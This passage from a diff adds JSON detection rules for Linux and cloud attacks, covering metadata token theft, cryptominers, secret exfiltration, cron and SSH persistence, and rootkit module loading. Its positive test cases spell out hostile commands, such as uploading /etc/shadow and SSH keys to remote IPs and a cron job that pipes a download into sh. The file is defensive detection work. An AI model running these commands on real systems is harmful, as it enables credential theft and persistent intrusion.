+      "command": "curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://169.254.169.254/latest/meta-data/instance-id"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-imds-userdata-read",
+   "name": "Instance user-data fetched by command",
+   "description": "curl of the metadata user-data endpoint, where bootstrap scripts commonly contain secrets.",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(169\\.254\\.169\\.254|metadata\\.google\\.internal)/\\S*(user-data|startup-script|attributes/)"
+     }
+    ]
+   },
+   "tags": [
+    "imds",
+    "cloud",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://169.254.169.254/latest/user-data"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://169.254.169.254/latest/meta-data/hostname"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-imds-network-nonagent",
+   "name": "Connection to the metadata service",
+   "description": "Network connection to 169.254.169.254, the AWS/Azure/GCP metadata endpoint; legitimate agents use it constantly so this is informational only.",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^(169\\.254\\.169\\.254|169\\.254\\.170\\.2|100\\.100\\.100\\.200|\\[?fd00:ec2::254\\]?)(:\\d+)?$"
+   },
+   "tags": [
+    "imds",
+    "cloud",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "destination": "169.254.169.254:80"
+     },
+     {
+      "destination": "169.254.170.2:80"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "169.254.1.1:80"
+     },
+     {
+      "destination": "10.0.0.5:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-miner-stratum-url",
+   "name": "Stratum mining URL on a command line",
+   "description": "A stratum+tcp, stratum+ssl or stratum2 URL given to any process.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "stratum(2)?\\+(tcp|ssl|tls|ws)://"
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/.m/xm",
+      "command": "./xm -o stratum+tcp://pool.example.net:3333 -u 4Abc -p x"
+     },
+     {
+      "executable": "/tmp/bin",
+      "command": "./bin --url stratum+ssl://xmr.example.org:443"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://pool-docs.example.com/stratum-protocol"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-miner-donate-level",
+   "name": "Miner command line switches",
+   "description": "xmrig-style switches (--donate-level, --coin monero, --randomx-*, -a cn/r) on a process command line.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "--donate-level[= ]\\d|--coin[= ]monero|--randomx-\\S+|\\s-a\\s+(cn/\\S+|rx/\\S+|randomx)\\s|--cpu-priority[= ]\\d.*--threads"
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/kworker",
+      "command": "./kworker --donate-level 0 -o pool.example:443 -u 4wallet"
+     },
+     {
+      "executable": "/dev/shm/.x",
+      "command": "./.x -a rx/0 -o pool.example:3333"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/gcc",
+      "command": "gcc -O2 -a main.c"
+     },
+     {
+      "executable": "/usr/bin/nice",
+      "command": "nice -n 19 make --threads 4"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-miner-binary-names",
+   "name": "Known miner binary executed",
+   "description": "xmrig, minerd, cpuminer, nbminer, t-rex, lolMiner, phoenixminer, ethminer or kdevtmpfsi process names.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "/(xmrig|xmr-stak|minerd|cpuminer(-\\w+)?|nbminer|t-rex|lolminer|phoenixminer|ethminer|kdevtmpfsi|kinsing|teamredminer|gminer|srbminer(-multi)?)(\\.exe)?$"
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/xmrig-6.21/xmrig",
+      "command": "./xmrig"
+     },
+     {
+      "executable": "/var/tmp/kinsing",
+      "command": "./kinsing"
+     },
+     {
+      "executable": "/opt/t-rex/t-rex",
+      "command": "./t-rex -a ethash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/mine",
+      "command": "mine --help"
+     },
+     {
+      "executable": "/usr/bin/minetest",
+      "command": "minetest --server"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-miner-pool-network",
+   "name": "Connection to a well-known mining pool",
+   "description": "A network connection to a public pool host or typical stratum ports on a pool name.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(supportxmr|minexmr|nanopool|moneroocean|c3pool|hashvault|2miners|f2pool|ethermine|nicehash|unmineable|herominers|miningpoolhub|monerohash|xmrpool|crazypool|zpool|p2pool)[a-z0-9.-]*\\.[a-z]{2,}(:\\d+)?$"
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "destination": "pool.supportxmr.com:443"
+     },
+     {
+      "destination": "xmr.2miners.com:2222"
+     },
+     {
+      "destination": "gulf.moneroocean.stream:10128"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "poolside.example.org:443"
+     },
+     {
+      "destination": "api.github.com:443"
+     },
+     {
+      "destination": "github.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-miner-pool-dns",
+   "name": "DNS lookup of a well-known mining pool",
+   "description": "DNS query for a public mining pool hostname.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "dns",
+   "match": {
+    "field": "query",
+    "op": "regex",
+    "pattern": "(supportxmr|minexmr|nanopool|moneroocean|c3pool|hashvault|2miners|f2pool|ethermine|nicehash|unmineable|herominers|monerohash|xmrpool|zpool|p2pool)[a-z0-9.-]*\\.[a-z]{2,}\\.?$"
+   },
+   "tags": [
+    "miner",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "query": "pool.supportxmr.com",
+       "qtype": "A"
+      }
+     },
+     {
+      "attrs": {
+       "query": "xmr-eu1.nanopool.org",
+       "qtype": "A"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "query": "www.example.com",
+       "qtype": "A"
+      }
+     },
+     {
+      "attrs": {
+       "query": "docs.github.com",
+       "qtype": "A"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-curl-upload-system-secrets",
+   "name": "System secret file uploaded with curl or wget",
+   "description": "curl -F/-d/-T/--upload-file or wget --post-file sending /etc/shadow, /etc/passwd, id_rsa or .env contents to a remote host.",
+   "tactic": "Exfiltration",
+   "technique": "T1048",
+   "technique_name": "Exfiltration Over Alternative Protocol",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-F\\s*\\S*=@|-d\\s*@|-T\\s+|--upload-file\\s+|--post-file[= ]|--data-binary\\s+@)\\s*\\S*(/etc/shadow|/etc/passwd|\\.ssh/id_\\w+|/\\.env\\b|\\.aws/credentials|\\.kube/config)"
+     }
+    ]
+   },
+   "tags": [
+    "exfil",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F f=@/etc/shadow http://203.0.113.5/up"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl --upload-file /root/.ssh/id_rsa https://198.51.100.9/k"
+     },
+     {
+      "executable": "/usr/bin/wget",
+      "command": "wget --post-file=/etc/passwd http://203.0.113.5/p"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -d @payload.json https://api.example.com/v1/items"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T build.tar.gz https://artifacts.example.com/up"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-tar-sensitive-staging",
+   "name": "Sensitive directories archived to a temp path",
+   "description": "tar/zip of /etc, ~/.ssh, ~/.aws, ~/.kube or /root into /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Collection",
+   "technique": "T1560.001",
+   "technique_name": "Archive Collected Data: Archive via Utility",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(tar|zip|7z|7za)\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s/(tmp|var/tmp|dev/shm)/\\S+\\.(t?gz|tar|zip|7z|bz2|xz)\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(/etc(\\s|/shadow|/passwd|$)|\\S*\\.ssh|\\S*\\.aws|\\S*\\.kube|\\S*\\.gnupg|/root(\\s|$))"
+     }
+    ]
+   },
+   "tags": [
+    "staging",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /tmp/loot.tgz /etc /root/.ssh"
+     },
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r /dev/shm/x.zip /home/ann/.aws /home/ann/.kube"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar czf /var/backups/etc-backup.tgz /etc/nginx"
+     },
+     {
+      "executable": "/usr/bin/tar",
+      "command": "tar xzf /tmp/app.tgz -C /opt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-crontab-load-temp-file",
+   "name": "crontab loading a file from a temp directory",
+   "description": "crontab (optionally -u user) installing a schedule file staged in /tmp, /var/tmp or /dev/shm.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/crontab"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "crontab\\s+(-u\\s+\\S+\\s+)?/(tmp|var/tmp|dev/shm)/\\S+"
+     }
+    ]
+   },
+   "tags": [
+    "cron",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab -u www-data /tmp/cron.txt"
+     },
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab /dev/shm/.c"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab -l"
+     },
+     {
+      "executable": "/usr/bin/crontab",
+      "command": "crontab /home/ann/jobs.cron"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-crond-shell-write-suspicious-payload",
+   "name": "cron.d entry written by shell with a temp-path or download payload",
+   "description": "A shell appends or writes a job into /etc/cron.d or cron.hourly/daily whose command runs from a temp directory or downloads and executes.",
+   "tactic": "Persistence",
+   "technique": "T1053.003",
+   "technique_name": "Scheduled Task/Job: Cron",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(echo|printf)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/dev/shm/|/var/tmp/|\\bcurl\\b|\\bwget\\b|/dev/tcp/)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": ">>?\\s*/etc/cron\\.(d|hourly|daily|weekly)/\\S+|tee\\s+(-a\\s+)?/etc/cron\\.(d|hourly|daily|weekly)/\\S+"
+     }
+    ]
+   },
+   "tags": [
+    "cron",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo \"*/10 * * * * root /tmp/.u\" >> /etc/cron.d/sysstat"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "sh -c echo '@hourly root curl -s http://203.0.113.4/x|sh' | tee /etc/cron.d/apt-x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c echo '0 3 * * * root /usr/local/bin/backup.sh' > /etc/cron.d/backup"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "cat /etc/cron.d/backup"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-ssh-authkeys-staged-copy",
+   "name": "authorized_keys replaced or extended from a temp-path file",
+   "description": "install, cp, mv, rsync or cat >> moving a file staged in /tmp, /var/tmp or /dev/shm into an authorized_keys file.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "technique_name": "Account Manipulation: SSH Authorized Keys",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(install|cp|mv|rsync|cat)\\b.*/(tmp|var/tmp|dev/shm)/\\S+.*\\S*\\.ssh/authorized_keys2?\\b"
+   },
+   "tags": [
+    "ssh",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/install",
+      "command": "install -m 600 /tmp/k.pub /root/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c cat /dev/shm/.k >> /home/www/.ssh/authorized_keys"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/cp",
+      "command": "cp /home/ann/.ssh/id_ed25519.pub /home/ann/.ssh/authorized_keys"
+     },
+     {
+      "executable": "/usr/bin/chmod",
+      "command": "chmod 600 /home/ann/.ssh/authorized_keys"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-insmod-relative-module",
+   "name": "insmod of a module by relative path",
+   "description": "insmod ./x.ko or a bare file name: modules outside /lib/modules are loaded by developers and rootkit installers alike, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/insmod"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "insmod\\s+(\\./|\\.\\./|[a-zA-Z0-9_-]+\\.ko)"
+     }
+    ]
+   },
+   "tags": [
+    "kernel-module",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/insmod",
+      "command": "insmod ./reptile.ko"
+     },
+     {
+      "executable": "/sbin/insmod",
+      "command": "insmod hide.ko"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/insmod",
+      "command": "insmod /lib/modules/6.1.0/kernel/fs/xfs.ko"
+     },
+     {
+      "executable": "/sbin/modprobe",
+      "command": "modprobe overlay"
+     }
+    ]
+   }
+  }
+ ]
+}
